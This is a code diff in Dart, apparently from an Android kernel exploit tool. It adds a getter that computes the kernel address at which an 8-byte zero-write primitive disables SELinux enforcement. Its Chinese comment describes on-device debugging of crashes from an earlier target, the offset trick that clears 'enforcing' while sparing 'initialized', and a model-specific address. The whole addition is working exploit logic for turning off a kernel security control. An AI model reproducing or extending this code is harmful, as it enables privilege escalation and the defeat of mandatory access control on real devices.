@@ -77,6 +77,27 @@ class Calibration {
     return '0x${p.toUnsigned(64).toRadixString(16)}';
   }
 
+  /// 「关 SELinux」零写的**实际落点**：selinux_state − 7
+  ///
+  /// 原因（2026-10-25 真机定位）：零写原语是 8 字节 store。若直接写 selinux_state 基址，
+  /// 会连带清零 +1 的 `initialized` ⇒ `security_sid_to_context_core: called before initializing`
+  /// ⇒ binder 取不到安全上下文、系统服务连环崩（相机 HAL `CamX::Actuator` 空指针、
+  /// 电话/输入法 start timeout），且**软重启不清内核**，必须硬重启才恢复。
+  ///
+  /// 改写到 base−7：8 字节覆盖 [base−7 … base]，最后一个字节正好落在 `enforcing`，
+  /// `initialized`(+1) 与 `status_page`(+8) 不受影响。base−7…base−1 是
+  /// `avc_latest_notif_update.notif_lock`（raw_spinlock_t，未持锁时全 0）与对齐填充，
+  /// 本机 CONFIG_DEBUG_SPINLOCK / DEBUG_LOCK_ALLOC 均未开 ⇒ 零写对它是 no-op。
+  /// 自检：本机型 0xffffff8049fe7a59。
+  String get selinuxZeroTargetHex {
+    final p = (BigInt.from(pageOffset) - BigInt.from(memStart)) +
+        BigInt.from(physBase) +
+        BigInt.from(0x10000) +
+        BigInt.from(selinuxStateOffset) -
+        BigInt.from(7);
+    return '0x${p.toUnsigned(64).toRadixString(16)}';
+  }
+
   Map<String, dynamic> toJson() => {
         'vermagic': vermagic,
         'tracepointId': tracepointId,
